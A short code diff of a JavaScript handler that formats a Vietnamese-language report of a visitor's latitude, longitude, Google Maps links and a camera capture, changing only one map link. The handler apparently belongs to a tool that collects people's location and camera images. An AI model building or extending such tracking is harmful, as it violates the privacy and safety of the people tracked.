@@ -53,7 +53,7 @@ export default async function handler(req) {
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
 🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}
-📌 Google Maps Embed: https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed
+📌 Google Maps Embed: https://www.google.com/maps/place/${lat},${lon}
 📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
